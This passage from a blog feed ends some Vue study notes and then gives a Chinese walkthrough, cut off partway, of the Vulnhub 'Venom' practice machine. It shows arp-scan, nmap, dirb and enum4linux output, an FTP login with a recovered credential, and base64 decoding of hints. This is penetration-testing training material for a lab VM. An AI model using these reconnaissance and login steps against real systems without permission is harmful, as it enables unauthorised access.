        <content type="html"><![CDATA[<h2 id="vue-day02"><a href="#vue-day02" class="headerlink" title="vue-day02"></a>vue-day02</h2><p><img src="/images/pasted-38.png" class="lazyload" data-srcset="/images/pasted-38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="vue过滤器"><a href="#vue过滤器" class="headerlink" title="vue过滤器"></a>vue过滤器</h3><p><img src="/images/pasted-39.png" class="lazyload" data-srcset="/images/pasted-39.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>过滤器函数必须被定义到filters节点之下（私有过滤器），过滤器本质上是一个函数，过滤器中一定要有一个返回值；过滤器函数形参中的val永远都是”管道符”前面那个值。</li><li>字符串有charAt()方法，这个方法接收索引值，表示从字符串中把索引对应的字符获取出来</li><li>字符串的slice方法可以截取字符串，从指定索引往后截取</li></ul><h4 id="全局过滤器"><a href="#全局过滤器" class="headerlink" title="全局过滤器"></a>全局过滤器</h4><p><img src="/images/pasted-40.png" class="lazyload" data-srcset="/images/pasted-40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>如果全局过滤器和私有过滤器一致，此时按照”就近原则”，调用的是”私有过滤器”</li></ul><h4 id="连续调用过滤器"><a href="#连续调用过滤器" class="headerlink" title="连续调用过滤器"></a>连续调用过滤器</h4><p><img src="/images/pasted-41.png" class="lazyload" data-srcset="/images/pasted-41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="侦听器"><a href="#侦听器" class="headerlink" title="侦听器"></a>侦听器</h3><ul><li><p>watch侦听器<br><img src="/images/pasted-42.png" class="lazyload" data-srcset="/images/pasted-42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>所有侦听器，都应该被定义到watch节点下</p></li><li><p>侦听器本质上是一个函数，要监视哪个数据的变化，就把数据名作为方法名即可</p></li><li><p>对象格式watch侦听器<br><img src="/images/pasted-43.png" class="lazyload" data-srcset="/images/pasted-43.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>immediate选项的默认值是false</p></li><li><p>immediate的作用是：控制侦听器是否自己触发一次</p></li><li><p>深度侦听</p></li><li><p>通过deep参数开启深度监听，只要对象中任何一个属性变化了都会触发”对象的侦听器”<br><img src="/images/pasted-44.png" class="lazyload" data-srcset="/images/pasted-44.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>如果要侦听的是对象的子属性的变化（info.username），则必须包裹一层单引号</p></li></ul><h3 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h3><p><img src="/images/pasted-45.png" class="lazyload" data-srcset="/images/pasted-45.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>所有计算属性都要定义到computed节点之下</li><li>计算属性在定义的时候，要定义成”定义格式”</li></ul><h3 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h3><blockquote><p>专注于网络请求的库</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-Venom</title>
      <link href="/64974.html"/>
      <url>/64974.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（Venom）过程"><a href="#记录打靶机（Venom）过程" class="headerlink" title="记录打靶机（Venom）过程"></a>记录打靶机（Venom）过程</h2><p>参考：<br>    <a href="https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/</a><br>    <a href="https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/">https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/</a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用<code>arp-scan</code>进行存活IP探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.0/24</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.147 00:0c:29:90:08:c7       VMware, Inc.</span><br><span class="line">192.168.109.254 00:50:56:f8:89:68       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.930 seconds (132.64 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>经探测可知目标IP为<code>192.168.109.147</code>，接下来对此IP进行端口扫描，尝试获取更多信息</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.109.147   </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 09:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.147</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 3.0.3</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">443/tcp open  ssl/https   Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: VENOM; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h09m59s, deviation: 3h10m31s, median: 7h59m58s</span><br><span class="line">|_nbstat: NetBIOS name: VENOM, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: venom</span><br><span class="line">|   NetBIOS computer name: VENOM\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: venom</span><br><span class="line">|_  System time: 2021-07-29T02:38:46+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2021-07-28T21:08:46</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 24.02 seconds</span><br></pre></td></tr></table></figure><p>经扫描可知目标开放了21（ftp）、80（http）、139（smb）、443（https）、445（smb）等多个端口。</p><p>整理一下思路针对不同端口：</p><ul><li>ftp（21）端口：<ul><li>尝试匿名用户登录 打岔 ✘<br>    * 漏洞数据库搜索相关版本漏洞，此处版本过高暂没有利用漏洞 打岔 ✘</li></ul></li><li>http（80）端口：<ul><li>读取源码，尝试获取敏感信息 ✔（此处在做的过程中没有仔细查看，漏掉重要突破口）</li></ul></li><li>smb（139、445）端口：<ul><li>可以尝试使用MSF中<code>ms 07-010</code>进行漏洞探测 ✗<br>    * 枚举SMB服务 ✔</li></ul></li><li>https（443）端口<ul><li>此端口暂没有什么思路</li></ul></li></ul><p><em><strong>以上思路经过验证并参考大神思路后得知突破口在http（80）端口</strong></em></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.109.147:80/ </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 31 11:10:45 2021</span><br><span class="line">URL_BASE: http://192.168.109.147:80/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.109.147:80/ ----</span><br><span class="line">+ http://192.168.109.147:80/index.html (CODE:200|SIZE:11004)                                                                                                                      </span><br><span class="line">+ http://192.168.109.147:80/server-status (CODE:403|SIZE:280)                                                                                                                     </span><br><span class="line">                                                                                                                                                                                  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 31 11:10:48 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure><p>经扫描<code>index.html</code>返回200，此页面是<code>Ubuntu LogoApache2 Ubuntu Default Page</code>，所以当时没想到查看源码，淦。在源码结尾藏有一段MD5加密的字符串：</p><p><img src="/images/pasted-19.png" class="lazyload" data-srcset="/images/pasted-19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><p><img src="/images/pasted-20.png" class="lazyload" data-srcset="/images/pasted-20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>经解密后得到<code>hostinger</code>,参考网上思路后得知需要枚举SMB服务，小笔记记下，因为对445端口做信息收集还是第一次</p><h2 id="枚举SMB服务"><a href="#枚举SMB服务" class="headerlink" title="枚举SMB服务"></a>枚举SMB服务</h2><p>参考网上使用<code>enum4linux</code>进行枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 192.168.109.147</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 28 09:18:59 2021</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.109.147</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.109.147    |</span><br><span class="line"> ======================================================= </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> =============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> =============================================== </span><br><span class="line">Looking up status of 192.168.109.147</span><br><span class="line">        VENOM           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        VENOM           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        VENOM           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================== </span><br><span class="line">|    Session Check on 192.168.109.147    |</span><br><span class="line"> ======================================== </span><br><span class="line">[+] Server 192.168.109.147 allows sessions using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ============================================== </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can<span class="string">&#x27;t determine if host is part of domain or part of a workgroup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    OS information on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span></span><br><span class="line"><span class="string">[+] Got OS info for 192.168.109.147 from smbclient: </span></span><br><span class="line"><span class="string">[+] Got OS info for 192.168.109.147 from srvinfo:</span></span><br><span class="line"><span class="string">        VENOM          Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu)</span></span><br><span class="line"><span class="string">        platform_id     :       500</span></span><br><span class="line"><span class="string">        os version      :       6.1</span></span><br><span class="line"><span class="string">        server type     :       0x809a03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ================================ </span></span><br><span class="line"><span class="string">|    Users on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ================================ </span></span><br><span class="line"><span class="string">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span></span><br><span class="line"><span class="string">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span></span><br><span class="line"><span class="string">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">|    Share Enumeration on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (venom server (Samba, Ubuntu))</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on 192.168.109.147</span></span><br><span class="line"><span class="string">//192.168.109.147/print$        Mapping: DENIED, Listing: N/A</span></span><br><span class="line"><span class="string">//192.168.109.147/IPC$  [E] Can&#x27;</span>t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Password Policy Information <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ======================================================= </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Attaching to 192.168.109.147 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">        [+] VENOM</span><br><span class="line">        [+] Builtin</span><br><span class="line"></span><br><span class="line">[+] Password Info <span class="keyword">for</span> Domain: VENOM</span><br><span class="line"></span><br><span class="line">        [+] Minimum password length: 5</span><br><span class="line">        [+] Password <span class="built_in">history</span> length: None</span><br><span class="line">        [+] Maximum password age: 37 days 6 hours 21 minutes </span><br><span class="line">        [+] Password Complexity Flags: 000000</span><br><span class="line"></span><br><span class="line">                [+] Domain Refuse Password Change: 0</span><br><span class="line">                [+] Domain Password Store Cleartext: 0</span><br><span class="line">                [+] Domain Password Lockout Admins: 0</span><br><span class="line">                [+] Domain Password No Clear Change: 0</span><br><span class="line">                [+] Domain Password No Anon Change: 0</span><br><span class="line">                [+] Domain Password Complex: 0</span><br><span class="line"></span><br><span class="line">        [+] Minimum password age: None</span><br><span class="line">        [+] Reset Account Lockout Counter: 30 minutes </span><br><span class="line">        [+] Locked Account Duration: 30 minutes </span><br><span class="line">        [+] Account Lockout Threshold: None</span><br><span class="line">        [+] Forced Log off Time: 37 days 6 hours 21 minutes </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ================================= </span><br><span class="line">|    Groups on 192.168.109.147    |</span><br><span class="line"> ================================= </span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting domain <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line"></span><br><span class="line"> ========================================================================== </span><br><span class="line">|    Users on 192.168.109.147 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br><span class="line"> ========================================================================== </span><br><span class="line">[I] Found new SID: S-1-22-1</span><br><span class="line">[I] Found new SID: S-1-5-21-3525385883-4254613925-43684688</span><br><span class="line">[I] Found new SID: S-1-5-32</span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-5-21-3525385883-4254613925-43684688 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">...skip...</span><br><span class="line"></span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-22-1 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">S-1-22-1-1000 Unix User\nathan (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\hostinger (Local User)</span><br><span class="line"></span><br><span class="line"> ================================================ </span><br><span class="line">|    Getting printer info <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ================================================ </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Wed Jul 28 09:19:14 2021</span><br></pre></td></tr></table></figure><p>经过枚举可以发现<code>hostinger</code>是使用者之一，结合之前解密的MD5值进行<code>ftp</code>登录</p><h2 id="ftp登录"><a href="#ftp登录" class="headerlink" title="ftp登录"></a>ftp登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.109.147</span><br><span class="line">Connected to 192.168.109.147.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.109.147:kali): hostinger</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 1002     1002         4096 May 21 23:43 files</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> files</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             384 May 21 23:43 hint.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get hint.txt</span><br><span class="line"><span class="built_in">local</span>: hint.txt remote: hint.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> hint.txt (384 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">384 bytes received <span class="keyword">in</span> 0.04 secs (10.3970 kB/s)</span><br></pre></td></tr></table></figure><p>可以登录成功，可以发现<code>files</code>目录下存在<code>hint.txt</code>，下载下来查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Hey there... </span><br><span class="line"></span><br><span class="line">T0D0 --</span><br><span class="line"></span><br><span class="line">* You need to follow the &#x27;hostinger&#x27; on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=</span><br><span class="line">* some knowledge of cipher is required to decode the dora password..</span><br><span class="line">* try on venom.box</span><br><span class="line">password -- L7f9l8@J#p%Ue+Q1234 -&gt; deocode this you will get the administrator password </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Have fun .. :)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在<code>hint.txt</code>中存在两段base64编码的字符串</p><h2 id="Base64-解码"><a href="#Base64-解码" class="headerlink" title="Base64 解码"></a>Base64 解码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=&#x27;</span> | <span class="built_in">base64</span> -d | <span class="built_in">base64</span> -d | <span class="built_in">base64</span> -d</span><br><span class="line">standard vigenere cipher                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=&#x27;</span> | <span class="built_in">base64</span> -d                            </span><br><span class="line">https://cryptii.com/pipes/vigenere-cipher                                               